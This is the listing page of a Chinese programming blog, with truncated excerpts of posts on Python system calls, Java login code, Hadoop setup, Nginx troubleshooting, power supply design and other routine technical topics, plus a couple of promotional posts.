<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b98f8ba5363a4860bed561796d3acb4/" rel="bookmark">
			Python调用执行Linux系统命令（四种方法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python调用执行Linux系统命令（四种方法） Python作为一门脚本语言，胶水语言，自然是有它的胶水特性的，就比如Python和Linux系统的结合，比如，在使用Python编写自动化运维脚本的时候，总免不了需要和Linux系统交互，如，查询Linux系统内的某个文件，然后修改这个文件并运行它（假设有可运行权限）。
Python让人称道的其中一个地方就是它的类库非常齐全，这是真的不吹牛，只有你想不到，基本没有它没有的库，比如科学计算库numpy，pandas这些，或者与系统交互的库，os库，或者自动化测试的selenium库等等，到底Python有多少库我想可能Python创始人也可能不知道。（Python的社区太强大了！！！！！）那么，如果Python需要调用Linux系统命令，比如，ls，df，free，ps，这样的命令自然是需要与系统交互的专用库os结合了，还一种方法就是直接操纵进程的啦，那么，自然就是subprocess库啦。也就是说，我们想要Python能够调用Linux系统命令，也就是Python与Linux系统交互，要么需要使用os库，要么需要使用subprocess库啦还有一个不太常用的commands库~~~！！！@~~~~
Python的os模块，见名之意，opera system的意思是毫无疑问了。该模块是Python的内建模块，也可以说是内建库了，该模块内的函数自然也是内建函数了，我们要和系统命令交互，需要使用它的system（），popen（）这两个函数，或者使用commands模块，或者使用subprocess模块，前面两个函数和commands模块是比较陈旧的，现在官方比较推荐也可以说强烈推荐的是subprocess模块。
(1) os.system（系统层面的直接调用），这个调用相当直接，且是同步进行的，程序需要阻塞并等待返回。返回值是依赖于系统的，直接返回系统的调用返回值，所以windows和linux是不一样的。
仅仅在一个子终端运行系统命令，而不能获取命令执行后的返回信息
(2) os.popen（新开线程方式），可以看出，popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值. 可见它获取返回值的方式和os.system不同。
该方法不但执行命令还返回执行后的信息对象，好处在于：将返回的结果赋于一变量，便于程序的处理。
(3) 使用模块 commands（ python3失效）
（4） 使用模块 subprocess（Python文档中目前全力推荐），直接调用命令，返回值即是系统返回。shell=True表示命令最终在shell中运行。Python文档中出于安全考虑，不建议使用shell=True。
import os import commands print('=============================ls') os.system('ls -al /') print('===========df') df = os.popen('df -ah').read() print(df) print('=========================free') a = commands.getoutput("free -mh") print(a) 输出结果为：
=============================ls total 28 dr-xr-xr-x. 17 root root 244 Jan 24 12:11 . dr-xr-xr-x. 17 root root 244 Jan 24 12:11 .. -rw-r--r-- 1 root root 0 Jan 24 12:11 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b98f8ba5363a4860bed561796d3acb4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c62575d160b181af5e46bbd3d41c3178/" rel="bookmark">
			手机号登录和微信登录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		感谢尚硅谷，直接上代码（尚医通解决方案）
@RestController @RequestMapping("/api/user") public class UserInfoApiController { @Autowired private UserInfoService userInfoService; //用户手机号登录接口 @PostMapping("login") public Result login(@RequestBody LoginVo loginVo) { Map&lt;String,Object&gt; info = userInfoService.loginUser(loginVo); return Result.ok(info); } } //用户手机号登录接口 @Override public Map&lt;String, Object&gt; loginUser(LoginVo loginVo) { //从loginVo获取输入的手机号，和验证码 String phone = loginVo.getPhone(); String code = loginVo.getCode(); //判断手机号和验证码是否为空 if (StringUtils.isEmpty(phone) || StringUtils.isEmpty(code)) { throw new YyghException(ResultCodeEnum.PARAM_ERROR); } //判断手机验证码和输入的验证码是否一致 String redisCode = redisTemplate.opsForValue().get(phone); if (!code.equals(redisCode)) { throw new YyghException(ResultCodeEnum.CODE_ERROR); } //绑定手机号码 UserInfo userInfo = null; if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c62575d160b181af5e46bbd3d41c3178/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01db7c23b870ff1fe416dd8b943a24d6/" rel="bookmark">
			400电话客服呼叫中心搭建流程及注意事项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		越来越多的企业都在搭建自己的客服中心，为了使客服流程更为体系化，有关系统方面问题请找博主，看他名字就可以微他一起交流学习。400电话客服呼叫中心在许多商业领域得到广泛运用，但是不少企业仍不清楚企业该如何搭建一个电话客服呼叫中心，具体搭建流程是怎样的以及要注意哪些事项，本文针对这些问题来谈谈如何搭建400电话客服呼叫中心。
电话客服呼叫中心素材图
（一）确定需求
在搭建客服呼叫中心系统前要有明确的规划，包括战略规划和业务规划。呼叫中心要以客户为中心，首先要确定的是行业特点以及目标定位，明白公司要建立怎样的营销体系，客群细分定位是怎样的，以及针对不同客群的差异化战略是怎样的，怎么维护客户关系和拓展新客户等问题。
业务规划其实是对战略规划的落地实施，主要包括咨询业务、售后服务与支持，即为客户提供产品咨询的相关服务，处理售后问题以及技术支持。
在确定需求这一阶段，也要考虑到技术方面的问题，根据自己的需求来考虑相应的技术策略。
（二）选择服务商
确认好客服呼叫中心的需求后，可以形成初期阶段的需求分析报告与可行性报告提交审批，在此同时可以筛选服务商，对市场上的服务商有大概了解，审批通过后可以采取项目招标的形式或者直接选定一家服务商，确认初步的搭建方案，包括前置接入、系统构架、呼叫中心选址等。
较为靠谱的服务商例如联信志诚，前期都会充分了解项目需求，不断优化与测试方案可行性，系统也能较快投入正式使用，性价比较高，售后支持全天在线。
（三） 建设与试运营
确定最终的服务商后，会由企业和服务商双方的人员共同组成一个项目组，开始对呼叫中心项目的实施。在此过程中，企业应当首先与服务商确定产品到货时间，并制定合适的项目实施计划和业务开发计划。在建设呼叫中心的环节中，很重要的一点就是服务商是否有成熟的经验来对项目的实施进行有序的指导。
在搭建完成后或者在搭建过程中，都需要技术人员跟进维护和测试，避免突发问题，搭建完成后，需要试运营，看是否需要调试，试运营需要IT技术人员往系统中导入基础的数据并进行系统测试，测试完成之后需要出具一份专门的系统测试评估与改进报告，并提交给项目工程方来进行修补和完善。如果没有问题，客服呼叫中心就可以正式投入运营了。
400电话客服呼叫中心系统搭建步骤分为确定需求、选择服务商、建设与试运营三个大的阶段，整个建设周期一般会长达1-3个月不等，企业可以根据需求和预算成本来选择制定搭建方案。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d7875c32c6f2b18c37e960d5f5d543e/" rel="bookmark">
			基于Spark的农产品分析系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章为大学毕业实习项目-基于Spark的农产品分析系统的文档，从搭建环境到代码编写以及成果展示。
Hadoop环境搭建 集群规划
服务器IP192.168.18.101192.168.18.102192.168.18.103主机名hadoop01hadoop02hadoop03NameNode是否否SecondaryNameNode是否否dataNode是是是ResourceManager是否否NodeManager是是 1.上传hadoop安装包并解压 tar -zxvf hadoop-2.7.5.tar.gz -C /opt/module/ 最后使用集群分发脚本xsync分发到其他服务器
xsync /opt/application/hadoop-2.7.3/ 现在，每个服务器都有hadoop安装包，目录为/opt/module，另外hadoop运行需要java环境。
2.配置环境变量 [root@hadoop101 hadoop-2.7.5]# pwd /opt/application/hadoop-2.7.3 [root@hadoop101 hadoop-2.7.5]# vim /etc/profile export HADOOP_HOME=/opt/application/hadoop-2.7.3 export PATH=$PATH:$HADOOP_HOME/bin export PATH=$PATH:$HADOOP_HOME/sbin [root@hadoop101 hadoop-2.7.5]# source /etc/profile [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-4zlRlZJU-1649489437027)(/Users/guopuwen/Desktop/C:\Users\VSUS\Desktop\笔记\大数据\img\4.png)]
到这，第一台机器的hadoop已经安装完毕，然后使用集群分发脚本将/etc/profile文件分发至各台机器，不要忘记重新加载配置文件
3.修改配置文件 配置文件都在etc/hadoop中
3.1 core-site.xml &lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://hadoop01:8020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/opt/application/hadoop-2.7.3/hadoopDatas/tempDatas&lt;/value&gt; &lt;/property&gt; &lt;!-- 缓冲区大小，实际工作中根据服务器性能动态调整 --&gt; &lt;property&gt; &lt;name&gt;io.file.buffer.size&lt;/name&gt; &lt;value&gt;4096&lt;/value&gt; &lt;/property&gt; &lt;!-- 开启hdfs的垃圾桶机制，删除掉的数据可以从垃圾桶中回收，单位分钟 --&gt; &lt;property&gt; &lt;name&gt;fs.trash.interval&lt;/name&gt; &lt;value&gt;10080&lt;/value&gt; &lt;/property&gt; 3.2 hdfs-site.xml &lt;property&gt; &lt;name&gt;dfs.namenode.secondary.http-address&lt;/name&gt; &lt;value&gt;hadoop101:50090&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address&lt;/name&gt; &lt;value&gt;hadoop101:50070&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d7875c32c6f2b18c37e960d5f5d543e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c13f8f7dd634d30ac9d4a9a7fc4275b9/" rel="bookmark">
			定义一个Person类{name,age,job},初始化Person对象数组，有三个person对象，并按照age从小到大进行排序，使用冒泡排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		**
定义一个Person类{name,age,job},初始化Person对象数组，有三个person对象，并按照age从小到大进行排序，使用冒泡排序 public class DemoA { public static void main(String[] args) { Person person[] = new Person[3]; person[0] = new Person("张三", 19, "经理"); person[1] = new Person("李四", 18, "董事长"); person[2] = new Person("马六", 34, "职工"); //输出当前对象数组 for (int i = 0; i &lt; person.length; i++) { System.out.println(person[i]); } //使用冒泡排序 Person temp = null;// 临时变量,用于交换 for (int i = 0; i &lt; person.length - 1; i++) {//外层循环 for (int j = 0; j &lt; person.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c13f8f7dd634d30ac9d4a9a7fc4275b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72c5875b203b4f3e559ccd77ac452982/" rel="bookmark">
			隔离电源和非隔离电源的区别，
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载---8号线攻城狮 2021-05-28 11:00 在产品设计时，倘若没有考虑应用环境对电源隔离的要求，产品到了应用时就会出现因设计方案的不当导致的系统不稳定，甚至出现高压损坏后级负载的情况，以及出现危害人身财产安全的情况。因此产品设计是否需要隔离至关重要。
“某公司员工在手机充电时打电话被电死”的新闻在网上引起广泛关注。充电器也能能危害生命？专家分析手机充电器内部变压器漏电，220VAC的交流电漏电到直流端，并通过数据线传导到了手机金属壳上，最终导致触电身亡，发生无可挽回的悲剧。
那么手机充电器输出端为什么会带有220V的交流电呢？隔离电源的选型要注意哪些事项？如何区分电源是隔离与非隔离？业内通用的看法是： 1、隔离电源：电源的输入回路和输出回路之间没有直接的电气连接，输入和输出之间是绝缘的高阻态，没有电流回路，如图1所示：
图1 采用变压器的隔离电源
2、非隔离电源：输入和输出之间有直接的电流回路，例如，输入和输出之间是共地的。以隔离的反激电路和非隔离的BUCK电路为例，如图2所示。 图2 非隔离电源 一、隔离电源与非隔离电源的优缺点
由上述概念可知，对于常用的电源拓扑而言，非隔离电源主要有：Buck、Boost、Buck-Boost等;而隔离电源主要有各种带隔离变压器的反激、正激、半桥、LLC等拓扑。
结合常用的隔离与非隔离电源，我们从直观上就可得出它们的一些优缺点，两者的优缺点几乎是相反的。
使用隔离或非隔离的电源，需了解实际项目对电源的需求是怎样的，但在此之前，可了解下隔离和非隔离电源的主要差别：
①隔离模块的可靠性高，但成本高，效率差点。
②非隔离模块的结构很简单，成本低，效率高，安全性能差。
因此，在如下几个场合，建议用隔离电源：
①涉及可能触电的场合，如从电网取电，转成低压直流的场合，需用隔离的AC-DC电源；
②串行通信总线通过RS-232、RS-485和控制器局域网(CAN)等物理网络传送数据，这些相互连接的系统每个都配备有自己的电源，而且各系统之间往往间隔较远，因此，我们通常需要隔离电源进行电气隔离来确保系统的物理安全，且通过隔离切断接地回路，来保护系统免受瞬态高电压冲击，同时减少信号失真；
③对外的I/O端口，为保证系统的可靠运行，也建议对I/O端口做电源隔离。
总结的表如表1所示，两者的优缺点几乎是相反的。
表1 隔离电源和非隔离电源的优缺点
二、隔离电源与非隔离电源的选择
通过了解隔离与非隔离电源的优缺点可知，它们各有优势，对于一些常用的嵌入式供电选择，我们已可做成准确的判断：
①系统前级的电源，为提高抗干扰性能，保证可靠性，一般用隔离电源。
② 电路板内的IC或部分电路供电，从性价比和体积出发，优先选用非隔离的方案。
③ 对安全有要求的场合，如需接市电的AC-DC，或医疗用的电源，为保证人身的安全，必须用隔离电源，有些场合还必须用加强隔离的电源。
④ 对于远程工业通信的供电，为有效降低地电势差和导线耦合干扰的影响，一般用隔离电源为每个通信节点单独供电。
⑤ 对于采用电池供电，对续航力要求严苛的场合，采用非隔离供电。
通过了解隔离与非隔离电源的优缺点可知，它们各有优势，对于一些常用的嵌入式供电设计，我们可总结出其选择的场合。
1、隔离电源 系统前级的电源，为提高抗干扰性能，保证可靠性，一般用隔离电源；
对安全有要求的场合，如需接市电的AC-DC，或医疗用的电源和白色家电，为保证人身的安全， 必须用隔离电源，如MPS的MP020，为原边反馈隔离型AC-DC，适合于1~10W应用 ；
对于远程工业通信的供电，为有效降低地电势差和导线耦合干扰的影响，一般用隔离电源为每个通信节点单独供电。
2、非隔离电源
电路板内的IC或部分电路供电，从性价比和体积出发，优先选用非隔离的方案；如MPS的MP150/157/MP174系列buck型非隔离AC-DC，适合于1~5W应用；
对于工作电压低于36V，采用电池供电，对续航力要求严苛的场合，优先采用非隔离供电，如MPS的MP2451/MPQ2451。
隔离电源与非隔离电源优缺点
通过了解隔离与非隔离电源的优缺点可知，它们各有优势，对于一些常用的嵌入式供电选择，我们可遵循以下判断条件：
对安全有要求的场合，如需接市电的AC-DC，或医疗用的电源，为保证人身的安全，必须用隔离电源，有些场合还必须用加强隔离的电源。
一般场合使用对模块电源隔离电压要求不是很高，但是更高的隔离电压可以保证模块电源具有更小的漏电流，更高的安全性和可靠性，并且EMC特性也更好一些，因此目前业界普遍的隔离电压水平为1500VDC以上。
三、隔离电源模块选型的注意事项
电源的隔离耐压在GB-4943国标中又叫抗电强度，这个GB-4943标准就是我们常说的信息类设备的安全标准，就是为了防止人员受到物理和电气伤害的国家标准，其中包括避免人受到电击伤害、物理伤害、爆炸等伤害。如下图为隔离电源结构图。 隔离电源结构图
作为模块电源的重要指标，标准中也规定了隔离耐压相关测试方法，简单的测试时一般采用等电位连接测试，连接示意图如下：
隔离耐压测试示意图
测试方法：
将耐压计的电压设为规定的耐压值，电流设为规定的漏电流值，时间设为规定的测试时间值；
操作耐压计开始测试，开始加压，在规定的测试时间内，模块应无击穿，无飞弧现象。
注意在测试时焊接电源模块要选取合适的温度，避免反复焊接，损坏电源模块。
除此之外还要注意：
1、要注意是AC-DC还是DC-DC。
2、隔离电源模块的隔离耐压。例如隔离1000V DC 是否满足绝缘要求。
3、隔离电源模块是否有进行全面的可靠性测试。电源模块要经过性能测试、容差测试、瞬态条件测试、可靠性测试、EMC电磁兼容测试、高低温测试、极限测试、寿命测试、安规测试等。
4、隔离电源模块的生产工厂产线是否规范。电源模块生产线需要通过ISO9001, ISO14001，OHSAS18001等多项国际认证，如下图3所示。
图3 ISO认证
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72c5875b203b4f3e559ccd77ac452982/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb31accdb00160820cb87b351bb3e08d/" rel="bookmark">
			深度学习(吴恩达)知识总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习 logistic回归Python中的技巧神经网络激活函数深层神经网络梯度的数值逼近Mini-batch 梯度下降动量梯度下降指数加权平均动量梯度下降公式 RMSpropAdam优化算法学习率衰减调试处理batch归一化Softmax激活函数分类Tensorflow卷积神经网络padding卷积步长三维卷积(可用于RGB图像)多核卷积(垂直、水平)单层卷积神经网络池化层 图像增强非极大值抑制Yolo算法步骤 logistic回归 y ^ = σ ( w T x + b ) \hat{y}=\sigma(w^Tx+b) y^​=σ(wTx+b),where σ ( z ) = 1 1 + e − z \sigma(z)=\frac{1}{1+e^{-z}} σ(z)=1+e−z1​
cost function: J ( w , b ) = 1 m ∑ i = 1 m L ( y ^ , y ( i ) ) = − 1 m ∑ i = 1 m [ y ( i ) l o g y ^ ( i ) + ( 1 − y ( i ) ) l o g ( 1 − y ^ ( i ) ) ] J(w,b)=\frac{1}{m}\sum_{i=1}^{m}\mathscr{L}(\hat{y},y^{(i)})=-\frac{1}{m}\sum_{i=1}^{m}[y^{(i)}log\hat{y}^{(i)}+(1-y^{(i)})log(1-\hat{y}^{(i)})] J(w,b)=m1​∑i=1m​L(y^​,y(i))=−m1​∑i=1m​[y(i)logy^​(i)+(1−y(i))log(1−y^​(i))]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb31accdb00160820cb87b351bb3e08d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d324b887c24168705843d7940c8561a7/" rel="bookmark">
			标准库：csv --- CSV 文件读写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSV (Comma Separated Values) 格式是电子表格和数据库中最常见的输入、输出文件格式。
csv 模块实现了 CSV 格式表单数据的读写。其提供了诸如“以兼容 Excel 的方式输出数据文件”或“读取 Excel 程序输出的数据文件”的功能，程序员无需知道 Excel 所采用 CSV 格式的细节。
csv 模块中的 reader 类和 writer 类可用于读写序列化的数据。也可使用 DictReader 类和 DictWriter 类以字典的形式读写数据。
csv 模块定义了以下函数： csv.reader(csvfile, dialect='excel', **fmtparams)
返回一个 reader 对象，该对象将逐行遍历 csvfile。
如果 csvfile 是文件对象，则打开它时应使用 newline=''。
可选参数 dialect 是用于不同的 CSV 变种的特定参数组。它可以是 Dialect 类的子类的实例，也可以是 list_dialects() 函数返回的字符串之一。
另一个可选关键字参数 fmtparams 可以覆写当前变种格式中的单个格式设置。请参见 变种与格式参数 部分。
import csv file = open('csvDemo.csv', newline='') csvReader = csv.reader(file, delimiter=' ', quotechar='|') for row in csvReader: for ceil in row: print(ceil) file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d324b887c24168705843d7940c8561a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe3c9656948ddabd662f7c2c3a42d981/" rel="bookmark">
			断点调试知识点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.断点调试的介绍2.断点调试的快捷键3.如何断点?4.断点调试各个功能 1.断点调试的介绍 1. 断点调试就是在程序的某一行设置一个断点，调试时，程序运行到这一行就会停住，然后你可以一步一步的往下调试，调试过程中可以看到各个变量的值，出错的话，调试到出错的代码行即显示错误，进而分析从而找到这个bug。
2.断点调试是程序员必备的技能
3.可以帮助我们查看java底层源码，提高程序员的水平。
2.断点调试的快捷键 F7：跳入方法内；F8：逐行执行代码块； shift+F8跳出方法；
3.如何断点? 单击鼠标左键点击想要断点的行数
4.断点调试各个功能 如图所示:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45cfe8132259d6d96160864054ec0ae9/" rel="bookmark">
			Java：Post请求无法获取传进来的参数解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 我是 ABin-阿斌：写一生代码，创一世佳话，筑一览芳华。 如果小伙伴们觉得我的文章不错，记得一键三连，感谢~
文章目录 问题：解决方案： 问题： 最近在测试一个接口的时候出现了一个参数不管怎么传都进去的问题，巨坑！！！一开始我以为是参数名写错了，我又复制了一遍没有问题。结果用 postman 请求还是不行，后面又debug拦截异常捕获的代码。搞了好久，各种重启、清楚缓存，还是没解决这问题。后面才发现原来是这个 @RequestBody 包引入成了 Swagger 的了，真的太坑了！！！这个问题，不细心真的发现不了！具体错误和接口可看下面图片 解决方案： 将 @RequestBody 包引入正确即可 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa6f13a1d4627fa4dba889e33bbb0a60/" rel="bookmark">
			请求头有问题导致Nginx返回400状态码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 上个星期有人找我看了Nginx的问题，场景是这样的，用户访问一个网址，这个网址有一个按钮，点击这个按钮后会跳转到新的页面，但这个跳转，有时候可以，有时候不可以——不可以的时候页面显示400状态码（开发反馈，同一个手机，不同浏览器，有的可以有的不可以；同一个手机，同一个浏览器，不同网络，有的可以，有的不可以）
问题排查 使用nginx日志排查问题 开发的手上有Nginx的access日志，通过查看返回400状态码的日志，我们发现日志显示进来的请求没有携带Host头的，而HTTP协议规定必须携带Host头，否则Nginx会直接抛出400 Bad Request。那么，问题的原因就是进来的请求没有携带Host头吗？并没有那么简单
分析抓包数据 一般来说，发出的请求不带Host是比较少见的，而且这个访问有时正常有时不正常，所以我们怀疑原因不是这个，要定位到问题原因，需要更多的数据进行分析。我们通常是在部署Nginx的Linux服务器上，使用tcpdump命令进行抓包，然后将抓到的包下载到本地的windows机器，使用wireshark工具进行分析。找到返回400状态码的Http流，查看请求头——（由于是在内网环境执行的操作，这些信息只能通过文字描述了），发现Host头是有的，并不像nginx的access日志所显示的没有Host头，那么为什么nginx没有识别到Host头呢？
原因分析 我们通过抓到的包，里面有正常请求和返回400的请求，经过比较，发现是其中一个请求头Refer不一样，并且返回400的请求的Refer在末尾携带了不可见字符（/000/000类似这样），我猜是因为这些字符，导致nginx对请求头都解析失败了，没有解析到Host头，于是就返回了400。
解决措施 联系相关的应用开发检查为什么会出现携带不可见字符的Refer并改正
总结 排查问题的时候，我们看到的原因可能不是根本原因，我们需要进一步获取原始数据、复现问题，经过对比和思考，定位根本原因并解决它
如果你对本文章有建议或疑问，欢迎在下面进行留言，一起交流
我是Vapire，一个普通的全栈开发。
以开发的角度看问题，用开发的方式学知识。
参考
鲜为人知的HTTP协议头字段详解大全 - 知乎 (zhihu.com)
Linux系统 tcpdump 抓包命令使用教程 - 知乎 (zhihu.com)
网络分析工具——WireShark的使用（超详细）_世间繁华梦一出的博客-CSDN博客_网络分析工具
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26eb2f37d53c19f40911783fea5bdbc0/" rel="bookmark">
			宝藏又小众的球形物体Flash动画素材网站分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		球形物体Flash动画素材素材，我常用的这个网站就挺好的，免费下载，资源多，品质优，而且资源类型都很齐全，要是大家需要可以看一下，真的不骗人！一键打包下载，快捷方便!
免费资源最多，又全面的网站，我找到啦！！它有很多素材，成品类的，元素类的，应有尽有。我刚找到这个网站的时候真的非常惊喜，非常良心的网站。
为大家整理了Flash动画-球形物体Flash动画素材合集
为了方便大家更快的找到资源，小编给大家指引路线：
搜索【爱给网】，进入网站后-点击-平面-资源库-Flash动画栏目，然后再点击动画素材-球形物体分类，这样就能找到啦！
接下来就让小编为大家详细推荐几个吧，都是我自己用过的哦，要是没有适合你的，你就去找找哦，好素材总是要自己发现滴
1、云层和月亮flash矢量动画
2、太阳升起flash日出片头
3、绿色草地蓝天太阳flash动画
球形物体Flash动画素材素材，我常用的这个网站就挺好的，免费下载，资源多，品质优，而且资源类型都很齐全，要是大家需要可以看一下，真的不骗人！一键打包下载，快捷方便!
免费资源最多，又全面的网站，我找到啦！！它有很多素材，成品类的，元素类的，应有尽有。我刚找到这个网站的时候真的非常惊喜，非常良心的网站。
为大家整理了Flash动画-球形物体Flash动画素材合集
为了方便大家更快的找到资源，小编给大家指引路线：
搜索【爱给网】或者访问【aigei点com】，进入网站后-点击-平面-资源库-Flash动画栏目，然后再点击动画素材-球形物体分类，这样就能找到啦！
接下来就让小编为大家详细推荐几个吧，都是我自己用过的哦，要是没有适合你的，你就去找找哦，好素材总是要自己发现滴
1、云层和月亮flash矢量动画
2、太阳升起flash日出片头
3、绿色草地蓝天太阳flash动画
4、模仿太空特效flash动画素材
5、汽车马路上奔跑flash动画
6、小女孩绕地球旋转flash动画
7、各种白云天气相关flash素材
8、彩色地球转动flash矢量素材
9、as2实现flash逼真水泡上升
10、浅绿色半透明地球flash动画
11、早上太阳升起flash动画
12、可爱笑脸太阳flash素材
13、日出日落flash动画素材
14、梦幻的彩色灯光flash动画
15、海底水泡向上浮动flash动画
今天就分享到这啦！有帮助到你记得点赞哦~小编专注推荐、测评国内外各种素材网站，有需要的关注不迷路！
4、模仿太空特效flash动画素材
5、汽车马路上奔跑flash动画
6、小女孩绕地球旋转flash动画
7、各种白云天气相关flash素材
8、彩色地球转动flash矢量素材
9、as2实现flash逼真水泡上升
10、浅绿色半透明地球flash动画
11、早上太阳升起flash动画
12、可爱笑脸太阳flash素材
13、日出日落flash动画素材
14、梦幻的彩色灯光flash动画
15、海底水泡向上浮动flash动画
今天就分享到这啦！有帮助到你记得点赞哦~小编专注推荐、测评国内外各种素材网站，有需要的关注不迷路！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c20851a17b25071e96afb1855033bd4/" rel="bookmark">
			java切换数据源（多数据源）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现在要在一个服务里设置两个数据源：oracle和mysql
1.需要写配置文件：
@Controller主要是加载spring配置类
@EnableTransactionManagement事务用法，在访问数据库的service中加@Transactional
@MapperScan指定要变成实现类的接口所在的包，然后包下面的所有接口在编译之后都会生成相应的实现类
@Configuration @EnableTransactionManagement(order = -200) @MapperScan("com.csair.mpms.mapper*") public class MyBatiesPlusConfiguration { // 精确到 master 目录，以便跟其他数据源隔离 static final String MAPPER_LOCATION = "classpath:mapper/*.xml"; /* * 分页插件，自动识别数据库类型 * 多租户，请参考官网【插件扩展】 */ @Bean public PaginationInterceptor paginationInterceptor() { PaginationInterceptor paginationInterceptor = new PaginationInterceptor(); // 开启 PageHelper 的支持 //paginationInterceptor.setLocalPage(true); return paginationInterceptor; } @Bean(name = "masterTransactionManager") public DataSourceTransactionManager masterTransactionManager() { return new DataSourceTransactionManager(masterDataSource()); } @Bean(name = "masterSqlSessionFactory") @Primary public SqlSessionFactory masterSqlSessionFactory(@Qualifier("masterDataSource") DataSource masterDataSource) throws Exception { final MybatisSqlSessionFactoryBean sessionFactory = new MybatisSqlSessionFactoryBean(); sessionFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c20851a17b25071e96afb1855033bd4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f69a9863c070c05a00001a3132a7dfe/" rel="bookmark">
			删除整形数组中最小值(C语言)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		请编写一道程序,该程序的功能是找出并且删除一维整形数组a[100]中的最小值元素.要求如下:
1.数组个元素通过键盘输入获得初始值.
2. 所有对数组元素的引用必须通过指针完成
#include &lt;stdio.h&gt; #include &lt;limits.h&gt; // 包含极值宏定义 // 1 输入并查找最小值 2.删除最小值 3.输出删除后的效果 int main () { int a[100], *p, i = 0; int min = INT_MAX, min_sub; // min 存储最小值, min_sub存储最小值下标 p = a; // 指针指向数组 do { printf("请输入第%d个元素:", i + 1); scanf("%d", p + i); if (*(p + i) &lt; min &amp;&amp; *(p + i) != -1) { min = *(p + i); // 存储最小值以及最小值下标 min_sub = i; } } while (*(p + i++) !
	</div>
	<div class="list__footer clearfix">
